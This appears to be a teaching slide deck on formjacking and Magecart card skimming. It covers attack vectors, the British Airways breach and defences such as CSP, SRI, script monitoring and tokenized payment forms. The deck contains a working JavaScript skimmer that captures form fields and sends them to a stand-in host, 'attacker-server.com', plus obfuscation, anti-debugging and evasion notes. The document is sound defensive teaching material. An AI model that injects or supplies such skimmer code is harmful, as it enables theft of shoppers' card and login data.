# Formjacking
---
## What is Formjacking?

- Formjacking, also known as Web Form Skimming or Digital Skimming, is a type of cyber attack where malicious code is injected into the payment forms of legitimate websites to steal sensitive information
- The digital equivalent of a card skimmer on an ATM machine
- Targets credit card details, personal data, and login credentials
- Extremely difficult for end users to detect -- the website looks and functions normally
- Symantec blocked over 3.7 million formjacking attempts in a single year (2018)

---
## How Does Formjacking Work

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="340" font-family="sans-serif">
  <defs>
    <marker id="arw2" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
      <polygon points="0 0, 10 3.5, 0 7" fill="#555"/>
    </marker>
  </defs>
  <rect x="1" y="1" width="658" height="338" rx="4" fill="#fff" stroke="#333" stroke-width="1.5"/>
  <rect x="1" y="1" width="658" height="34" rx="4" fill="#e3f2fd" stroke="#333" stroke-width="1.5"/>
  <text x="330" y="23" font-size="15" font-weight="bold" fill="#222" text-anchor="middle">Formjacking Attack Flow</text>
  <text x="14" y="54" font-size="13" fill="#333">1. Attacker compromises website or third-party script</text>
  <text x="14" y="72" font-size="13" fill="#333">2. Malicious JavaScript injected into payment page</text>
  <!-- Customer Browser box -->
  <rect x="30" y="90" width="140" height="80" rx="4" fill="#e8f5e9" stroke="#333" stroke-width="1.5"/>
  <text x="100" y="126" font-size="13" font-weight="bold" fill="#222" text-anchor="middle">Customer</text>
  <text x="100" y="144" font-size="13" font-weight="bold" fill="#222" text-anchor="middle">Browser</text>
  <text x="100" y="162" font-size="11" fill="#555" text-anchor="middle">Enters card details</text>
  <!-- Compromised Website box -->
  <rect x="250" y="90" width="160" height="80" rx="4" fill="#fff3e0" stroke="#e65100" stroke-width="2"/>
  <text x="330" y="122" font-size="13" font-weight="bold" fill="#222" text-anchor="middle">Compromised</text>
  <text x="330" y="138" font-size="13" font-weight="bold" fill="#222" text-anchor="middle">E-Commerce Site</text>
  <text x="330" y="156" font-size="11" fill="#e65100" text-anchor="middle">Skimmer JS active</text>
  <!-- Arrow: Browser → Website -->
  <line x1="170" y1="130" x2="250" y2="130" stroke="#555" stroke-width="1.5" marker-end="url(#arw2)"/>
  <!-- Payment Processor box -->
  <rect x="120" y="240" width="150" height="70" rx="4" fill="#e8f5e9" stroke="#333" stroke-width="1.5"/>
  <text x="195" y="271" font-size="13" font-weight="bold" fill="#222" text-anchor="middle">Payment</text>
  <text x="195" y="289" font-size="13" font-weight="bold" fill="#222" text-anchor="middle">Processor (Stripe)</text>
  <!-- Attacker Server box -->
  <rect x="430" y="240" width="150" height="70" rx="4" fill="#ffebee" stroke="#c62828" stroke-width="2"/>
  <text x="505" y="271" font-size="13" font-weight="bold" fill="#c62828" text-anchor="middle">Attacker's</text>
  <text x="505" y="289" font-size="13" font-weight="bold" fill="#c62828" text-anchor="middle">Server (exfil.cc)</text>
  <!-- Arrow: Website → Payment Processor (normal flow) -->
  <line x1="330" y1="170" x2="195" y2="240" stroke="#2e7d32" stroke-width="1.5" marker-end="url(#arw2)"/>
  <text x="235" y="210" font-size="11" fill="#2e7d32" text-anchor="middle">normal flow</text>
  <!-- Arrow: Website → Attacker (stolen copy) -->
  <line x1="380" y1="170" x2="505" y2="240" stroke="#c62828" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arw2)"/>
  <text x="462" y="210" font-size="11" fill="#c62828" text-anchor="middle">stolen copy</text>
  <text x="14" y="330" font-size="13" fill="#333">3. Transaction completes normally (victim unaware)  4. Attacker collects stolen card data</text>
</svg>

---
## Attack Vectors

| Vector                        | Description                                    | Prevalence |
|-------------------------------|------------------------------------------------|------------|
| Direct website compromise     | Attacker gains access to web server            | Common     |
| Third-party script compromise | Inject via analytics, chat, or ad scripts      | Very common|
| Supply chain attack           | Compromise an npm/CDN dependency               | Growing    |
| Magento/CMS vulnerabilities   | Exploit known CMS security flaws               | Common     |
| Compromised admin credentials | Access CMS admin panel, inject code            | Common     |
| CDN/hosting compromise        | Modify scripts served from CDN                 | Rare       |

---
## Magecart Groups

- "Magecart" is an umbrella term for cybercriminal groups specializing in formjacking
- Named after the Magento e-commerce platform they initially targeted
- At least 12 distinct groups identified by researchers

| Group       | Notable Targets                          | Technique                    |
|-------------|------------------------------------------|------------------------------|
| Magecart 1  | Magento stores                           | Direct server compromise     |
| Magecart 3  | Feedify (cloud widget)                   | Supply chain attack          |
| Magecart 5  | Ticketmaster (via Inbenta)               | Third-party script injection |
| Magecart 6  | British Airways, Newegg                  | Custom targeted skimmers     |
| Magecart 9  | Various e-commerce                       | Obfuscated JS injection      |
| Magecart 12 | OpenCart, Magento stores                 | Google Analytics mimicry     |

---
## British Airways Attack (2018)

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="270" font-family="sans-serif">
  <rect x="1" y="1" width="658" height="268" rx="4" fill="#fff" stroke="#333" stroke-width="1.5"/>
  <rect x="1" y="1" width="658" height="34" rx="4" fill="#e3f2fd" stroke="#333" stroke-width="1.5"/>
  <text x="330" y="23" font-size="15" font-weight="bold" fill="#222" text-anchor="middle">British Airways Magecart Attack</text>
  <!-- Timeline section -->
  <text x="14" y="56" font-size="13" font-weight="bold" fill="#1565c0">Timeline:</text>
  <text x="14" y="74" font-size="13" fill="#333">&#8226; Aug 21 – Sep 5, 2018 (15 days undetected)</text>
  <text x="14" y="92" font-size="13" fill="#333">&#8226; ~380,000 payment cards stolen</text>
  <text x="14" y="110" font-size="13" fill="#333">&#8226; British Airways fined £20 million by ICO (GDPR)</text>
  <line x1="14" y1="120" x2="646" y2="120" stroke="#ddd" stroke-width="1"/>
  <!-- Attack method section -->
  <text x="14" y="138" font-size="13" font-weight="bold" fill="#1565c0">Attack method:</text>
  <text x="14" y="156" font-size="13" fill="#333">&#8226; 22 lines of JavaScript injected into BA website</text>
  <text x="14" y="174" font-size="13" fill="#333">&#8226; Targeted the payment form specifically</text>
  <text x="14" y="192" font-size="13" fill="#333">&#8226; Data exfiltrated to baways.com (typosquat domain)</text>
  <text x="14" y="210" font-size="13" fill="#333">&#8226; Attackers had valid SSL certificate for exfil domain</text>
  <line x1="14" y1="220" x2="646" y2="220" stroke="#ddd" stroke-width="1"/>
  <!-- Key lesson -->
  <text x="14" y="238" font-size="13" font-weight="bold" fill="#1565c0">Key lesson:</text>
  <text x="14" y="256" font-size="13" fill="#333">Extremely targeted, minimal code, custom-built for specific form — SSL on exfil avoided browser warnings</text>
</svg>

---
## JavaScript Skimmer Code Analysis

### Simple Skimmer Example (Educational)

```javascript
// WARNING: This is a simplified example for educational purposes only

// Typical skimmer attaches to form submission events
document.addEventListener('submit', function(event) {
    var form = event.target;
    var formData = {};

    // Collect all input field values
    var inputs = form.querySelectorAll('input, select');
    inputs.forEach(function(input) {
        if (input.name && input.value) {
            formData[input.name] = input.value;
        }
    });

    // Exfiltrate data to attacker's server
    var img = new Image();
    img.src = 'https://attacker-server.com/collect?data=' +
              btoa(JSON.stringify(formData));
    // Using an Image() request avoids CORS restrictions
    // Base64 encoding hides the data in transit
});
```

---
## Advanced Skimmer Techniques

```c
┌──────────────────────────────────────────────────────────┐
│          Skimmer Evasion Techniques                       │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  Obfuscation:                                            │
│  - String encoding (base64, hex, charCode)               │
│  - Variable name randomization                           │
│  - Code splitting across multiple files                  │
│  - Steganography (hide JS in image files)                │
│                                                          │
│  Anti-Detection:                                         │
│  - Only activate on checkout/payment pages               │
│  - Check for developer tools (debugger detection)        │
│  - Avoid running in sandboxed/analysis environments      │
│  - Delay execution to avoid automated scanning           │
│  - Only skim on specific browsers/geolocations           │
│                                                          │
│  Exfiltration:                                           │
│  - Image pixel requests (bypasses CORS)                  │
│  - WebSocket connections                                 │
│  - Disguised as analytics/tracking requests              │
│  - Encrypted payloads to blend with HTTPS traffic        │
│  - Store data in localStorage, exfil later               │
└──────────────────────────────────────────────────────────┘
```

```javascript
// Example: Obfuscated exfiltration disguised as analytics
var _0x4a2b = ['\x67\x65\x74','\x73\x65\x6e\x64'];
// Decoded: ['get','send']

// Anti-debugging check
setInterval(function() {
    var start = performance.now();
    debugger;  // Pauses if DevTools is open
    if (performance.now() - start > 100) {
        // Developer tools detected, stop skimming
        return;
    }
}, 1000);
```

---
## Content Security Policy (CSP) as Defense

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="160" font-family="sans-serif">
  <rect x="1" y="1" width="658" height="158" rx="4" fill="#fff" stroke="#333" stroke-width="1.5"/>
  <rect x="1" y="1" width="658" height="34" rx="4" fill="#e3f2fd" stroke="#333" stroke-width="1.5"/>
  <text x="330" y="23" font-size="15" font-weight="bold" fill="#222" text-anchor="middle">CSP Defense Against Formjacking</text>
  <!-- Without CSP -->
  <rect x="14" y="44" width="300" height="104" rx="4" fill="#ffebee" stroke="#c62828" stroke-width="1.5"/>
  <rect x="14" y="44" width="300" height="28" rx="4" fill="#c62828"/>
  <text x="164" y="63" font-size="13" font-weight="bold" fill="#fff" text-anchor="middle">Without CSP</text>
  <text x="26" y="88" font-size="13" fill="#333">Any script can run</text>
  <text x="26" y="108" font-size="13" fill="#333">Any destination can receive data</text>
  <!-- With CSP -->
  <rect x="344" y="44" width="300" height="104" rx="4" fill="#e8f5e9" stroke="#2e7d32" stroke-width="1.5"/>
  <rect x="344" y="44" width="300" height="28" rx="4" fill="#2e7d32"/>
  <text x="494" y="63" font-size="13" font-weight="bold" fill="#fff" text-anchor="middle">With CSP</text>
  <text x="356" y="88" font-size="13" fill="#333">Only approved scripts run</text>
  <text x="356" y="108" font-size="13" fill="#333">Only approved destinations receive data</text>
</svg>

```http
# HTTP Header: Content-Security-Policy
Content-Security-Policy:
    default-src 'self';
    script-src 'self' https://js.stripe.com;
    connect-src 'self' https://api.stripe.com;
    img-src 'self' data:;
    style-src 'self' 'unsafe-inline';
    frame-src https://js.stripe.com;
    form-action 'self' https://api.stripe.com;
    report-uri /csp-report;
```

### Key CSP Directives for Formjacking Defense

| Directive      | Purpose                                      | Example Value              |
|----------------|----------------------------------------------|----------------------------|
| `script-src`   | Allowed JavaScript sources                   | `'self' https://cdn.com`   |
| `connect-src`  | Allowed AJAX/fetch/WebSocket destinations    | `'self' https://api.com`   |
| `form-action`  | Allowed form submission targets              | `'self'`                   |
| `img-src`      | Allowed image sources (blocks pixel exfil)   | `'self' data:`             |
| `report-uri`   | Where to send CSP violation reports          | `/csp-violations`          |

---
## Implementing CSP

```python
# Flask example: Adding CSP headers
from flask import Flask, make_response

app = Flask(__name__)

@app.after_request
def add_csp_header(response):
    csp = (
        "default-src 'self'; "
        "script-src 'self' https://js.stripe.com; "
        "connect-src 'self' https://api.stripe.com; "
        "img-src 'self' data:; "
        "style-src 'self'; "
        "form-action 'self'; "
        "frame-ancestors 'none'; "
        "report-uri /csp-report"
    )
    response.headers['Content-Security-Policy'] = csp
    return response

# Start with report-only mode to avoid breaking things
# Content-Security-Policy-Report-Only: <same policy>

@app.route('/csp-report', methods=['POST'])
def csp_report():
    """Collect CSP violation reports."""
    report = request.get_json(force=True)
    log_csp_violation(report)
    return '', 204
```

---
## Subresource Integrity (SRI)

```html
<!-- WITHOUT SRI: If CDN is compromised, malicious JS executes -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js">
</script>

<!-- WITH SRI: Browser verifies hash before executing -->
<script
    src="https://cdn.example.com/jquery-3.6.0.min.js"
    integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfG"
    crossorigin="anonymous">
</script>
```

```python
┌──────────────────────────────────────────────────────────┐
│          How SRI Works                                    │
│                                                          │
│  1. Developer calculates hash of known-good script       │
│     $ shasum -b -a 384 jquery.min.js | base64            │
│                                                          │
│  2. Hash is included in the integrity attribute           │
│     integrity="sha384-<hash>"                            │
│                                                          │
│  3. Browser downloads the script from CDN                │
│                                                          │
│  4. Browser calculates hash of downloaded content        │
│                                                          │
│  5. If hashes match    -> script executes normally       │
│     If hashes differ   -> script is BLOCKED              │
│     (attacker modified -> blocked!)                      │
└──────────────────────────────────────────────────────────┘
```

```bash
# Generate SRI hash for a local file
cat jquery.min.js | openssl dgst -sha384 -binary | openssl base64 -A

# Or use the srihash.org website
# Or use npm: npx ssri integrity jquery.min.js
```

---
## Detection Methods

### Client-Side Detection

```javascript
// MutationObserver: Watch for unexpected DOM changes
const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        mutation.addedNodes.forEach(function(node) {
            if (node.tagName === 'SCRIPT') {
                // Alert on unexpected script injection
                console.warn('New script detected:', node.src);
                reportSuspiciousScript(node);
            }
        });
    });
});

observer.observe(document.documentElement, {
    childList: true,
    subtree: true
});
```

### Server-Side Detection

```bash
# File integrity monitoring (detect modified files)
# Using AIDE (Advanced Intrusion Detection Environment)
sudo aide --init
sudo aide --check

# Compare current JS files against known-good hashes
find /var/www/html -name "*.js" -exec sha256sum {} \; > current.txt
diff known_good_hashes.txt current.txt
```

---
## Detection Tools and Services

| Tool / Service        | Type             | Capability                          |
|-----------------------|------------------|-------------------------------------|
| CSP Reporting         | Built-in browser | Detect unauthorized script sources  |
| AIDE / OSSEC          | Server-side      | File integrity monitoring           |
| MutationObserver API  | Client-side      | Detect DOM manipulation             |
| Jscrambler            | Commercial       | Real-time webpage integrity         |
| PerimeterX            | Commercial       | Bot and skimmer detection           |
| Source Defense        | Commercial       | Client-side protection platform     |
| Report URI            | SaaS             | CSP violation monitoring            |

---
## PCI DSS Requirements for Formjacking

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="292" font-family="sans-serif">
  <rect x="1" y="1" width="658" height="290" rx="4" fill="#fff" stroke="#333" stroke-width="1.5"/>
  <rect x="1" y="1" width="658" height="34" rx="4" fill="#e3f2fd" stroke="#333" stroke-width="1.5"/>
  <text x="330" y="23" font-size="15" font-weight="bold" fill="#222" text-anchor="middle">PCI DSS 4.0 Requirements (effective March 2025)</text>
  <!-- Requirement 6.4.3 -->
  <rect x="14" y="44" width="630" height="88" rx="4" fill="#f0f4f8" stroke="#555" stroke-width="1"/>
  <text x="26" y="64" font-size="13" font-weight="bold" fill="#1565c0">Requirement 6.4.3 — All payment page scripts must be:</text>
  <text x="26" y="84" font-size="13" fill="#333">&#8226; Inventoried and authorized</text>
  <text x="26" y="102" font-size="13" fill="#333">&#8226; Integrity verified (SRI or equivalent)</text>
  <text x="26" y="120" font-size="13" fill="#333">&#8226; Script behavior documented and justified</text>
  <!-- Requirement 11.6.1 -->
  <rect x="14" y="142" width="630" height="106" rx="4" fill="#f0f4f8" stroke="#555" stroke-width="1"/>
  <text x="26" y="162" font-size="13" font-weight="bold" fill="#1565c0">Requirement 11.6.1 — Implement change/tamper detection for:</text>
  <text x="26" y="182" font-size="13" fill="#333">&#8226; HTTP headers (CSP, etc.)</text>
  <text x="26" y="200" font-size="13" fill="#333">&#8226; Payment page script content</text>
  <text x="26" y="218" font-size="13" fill="#333">&#8226; Must alert on unauthorized changes</text>
  <text x="26" y="240" font-size="13" fill="#555">&#8658; These requirements make CSP and SRI effectively mandatory for any</text>
  <text x="26" y="258" font-size="13" fill="#555">   site processing credit cards</text>
  <rect x="14" y="232" width="630" height="50" rx="4" fill="#fff9c4" stroke="#f9a825" stroke-width="1"/>
  <text x="26" y="252" font-size="13" fill="#555">&#8658; These requirements make CSP and SRI effectively mandatory for any</text>
  <text x="26" y="270" font-size="13" fill="#555">   site processing credit cards</text>
</svg>

---
## Defense in Depth Strategy

```bash
┌──────────────────────────────────────────────────────────┐
│  Layer 1: Prevention                                     │
│  ├── Content Security Policy (strict script-src)         │
│  ├── Subresource Integrity (SRI) for all external JS     │
│  ├── Third-party script sandboxing (iframes)             │
│  └── Minimize third-party scripts                        │
│                                                          │
│  Layer 2: Detection                                      │
│  ├── CSP violation reporting and monitoring              │
│  ├── File integrity monitoring (AIDE, OSSEC)             │
│  ├── Web application firewall (WAF)                      │
│  └── Synthetic monitoring (automated checkout tests)     │
│                                                          │
│  Layer 3: Response                                       │
│  ├── Incident response plan specific to formjacking      │
│  ├── Rapid rollback capability                           │
│  ├── Customer notification procedures                    │
│  └── Forensic investigation process                      │
│                                                          │
│  Layer 4: Architecture                                   │
│  ├── Host payment forms in isolated iframe               │
│  ├── Use tokenized payment (Stripe Elements)             │
│  ├── Server-side payment processing when possible        │
│  └── Regular security audits and penetration testing     │
└──────────────────────────────────────────────────────────┘
```

---
## Best Practice: Tokenized Payment Forms

```html
<!-- VULNERABLE: Self-hosted payment form -->
<form action="/pay" method="POST">
    <input name="card_number" type="text">
    <input name="expiry" type="text">
    <input name="cvv" type="text">
    <button type="submit">Pay</button>
</form>
<!-- Skimmer can easily read these fields -->

<!-- SECURE: Stripe Elements (hosted iframe) -->
<div id="card-element"></div>
<script src="https://js.stripe.com/v3/"
    integrity="sha384-..."
    crossorigin="anonymous"></script>
<script>
    var stripe = Stripe('pk_live_xxx');
    var elements = stripe.elements();
    var card = elements.create('card');
    card.mount('#card-element');
    // Card details never touch your server or DOM
    // Skimmer cannot access iframe content (same-origin)
</script>
```

- Payment fields are in a cross-origin iframe controlled by Stripe
- Your JavaScript cannot read the iframe content (browser security)
- Skimmer code on your site cannot access the card data
- PCI DSS scope is dramatically reduced

---
## Key Takeaways

- Formjacking is one of the most profitable and stealthy web attacks
- Magecart groups have evolved sophisticated, targeted skimming techniques
- Third-party scripts are the most common attack vector -- minimize and control them
- CSP is the strongest browser-level defense: restrict script sources and data destinations
- SRI ensures external scripts have not been tampered with
- Tokenized payment forms (Stripe Elements, Braintree) are the best architectural defense
- PCI DSS 4.0 now requires script inventory, integrity checks, and tamper detection
- Defense in depth: combine CSP + SRI + monitoring + tokenized payments
